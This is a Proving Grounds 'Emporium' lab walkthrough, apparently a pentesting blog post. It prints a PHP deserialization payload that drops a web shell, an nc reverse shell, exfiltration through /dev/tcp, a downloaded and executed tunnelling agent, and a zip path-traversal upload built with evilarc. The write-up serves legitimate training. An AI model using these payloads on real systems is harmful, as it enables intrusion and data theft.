---
title: Emporium
date: 2026-04-19T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - zip
  - web
  - Caido
  - updog
  - ligolo-ng
  - gobuster
  - curl
  - revshells
  - php
  - route
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Emporium"
---
"Nothing in this world can take the place of persistence. Talent will not; nothing is more common than unsuccessful men with talent." - Calvin Coolidge.

![](Screenshot%202026-04-17%20at%2009.03.35.png)

![](Screenshot%202026-04-18%20at%2007.39.56.png)

![](Screenshot%202026-04-17%20at%2009.04.03.png)

![](Screenshot%202026-04-18%20at%2015.06.30.png)

![](Screenshot%202026-04-17%20at%2009.21.50.png)


`curl http://192.168.236.223/backup.zip -o backup.zip`  
`unzip backup.zip`

![](Screenshot%202026-04-18%20at%2015.09.46.png)

![](Screenshot%202026-04-18%20at%2015.24.18.png)

![](Screenshot%202026-04-18%20at%2015.25.10.png)

I had help understanding this. 

There are 3 criteria that must be met:
- debug=true
- the message indicator
- An email address

This script will create a url-encoded php injection, that will create a file containing vulnerable php code. 

```
<?php
class AddSubscriber {
    public $sub_file = "itsatrap.php";
    public $info = '<?php system($_GET["c"]); ?>';
}
print urlencode(serialize(new AddSubscriber));
?>
```

[IP] [debug=true] [message=O%3A13%3A%22A.....] [email=test@test.com ]

![](Screenshot%202026-04-18%20at%2015.43.09.png)

```
http://192.168.236.223/index.php?debug=true&message=O%3A13%3A%22AddSubscriber%22%3A2%3A%7Bs%3A8%3A%22sub_file%22%3Bs%3A12%3A%22itsatrap.php%22%3Bs%3A4%3A%22info%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D&email=test@test.co
```

![](Screenshot%202026-04-19%20at%2012.49.53.png)

![](Screenshot%202026-04-18%20at%2015.58.02.png)

`http://192.168.236.223/itsatrap.php?cmd=whoami`

![](Screenshot%202026-04-18%20at%2015.57.07.png)

![](Screenshot%202026-04-20%20at%2017.38.25.png)

Create a reverse shell command:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.195 80 >/tmp/f
```


Start a listener:  
Kali: `rlwrap nc -lnvp 80` 

URL encode this command:

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fbash%2i%202%3E%261|nc%20192.168.45.195%2080%20%3E%2Ftmp%2Ff
```
![](Screenshot%202026-04-20%20at%2017.41.34.png)

Or use a browser:

![](Screenshot%202026-04-20%20at%2017.44.01.png)

![](Screenshot%202026-04-19%20at%2013.08.32.png)

There is a interesting looking file in an upload folder that points the way. 

![](Screenshot%202026-04-20%20at%2015.53.50.png)

I used this command to extract the file:  
Kali: `rlwrap nc -lvnp > 87-shell.zip`  
Victim: `cat  87-shell.zip > /dev/tcp/192.168.45.195/1234`


`netstat -ano`

![](Screenshot%202026-04-19%20at%2014.50.03.png)

Webpage with functionality on local port: 8080

![](Screenshot%202026-04-19%20at%2014.50.46.png)

Set up a #ligolo-ng tunnel: 

```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

Start ligolo-ng:
`sudo ligolo-proxy -selfcert`

![](Screenshot%202026-04-20%20at%2007.59.02.png)

Move the linux agent onto the victim machine:
kali: `updog`
victum: `curl http://192.168.45.195/agent -o agent`

Start the agent:
```
chmod 777 agent
./agent -ignore-cert -connect 192.168.45.195:11601

```
![](Screenshot%202026-04-20%20at%2008.00.55.png)

Start the session:
session >  1 > start

![](Screenshot%202026-04-20%20at%2008.09.53.png)

Add a route to your tunnel:
`sudo ip route add 240.0.0.1/32 dev ligolo`

Remember that if your session drops you'll need to re-add this route.

![](Screenshot%202026-04-19%20at%2015.33.53.png)

`http://240.0.0.1:8080`

![](Screenshot%202026-04-19%20at%2015.35.44.png)

Earlier we extracted a zip file. We can repurpose the shell.php file. We now know the upload location where it needs to extract to(/root/web). 

Modify the shell.php file that was in extracted from 87-shell.zip

![](Screenshot%202026-04-20%20at%2017.01.37.png)

I found this helpful:  
https://www.youtube.com/watch?v=4sKlbMiGWAw

This is what we'll use to make the malicious zip file.   
https://github.com/ptoomey3/evilarc/blob/master/evilarc.py

- Path = ../../../../../root/web
- malicious php file
- OS = unix

`python2 evilarc.py shell.php -p root/web -d 5 -o unix`

Upload this to through the site:

![](Screenshot%202026-04-20%20at%2017.05.14.png)

Start a listener:  
kali: rlwrap nc -lvnp 443

Navigate to your upload:  
Browser: http:240.0.0.1:8080/shell.php

🐚 .. 😈

![](Screenshot%202026-04-20%20at%2017.52.38.png)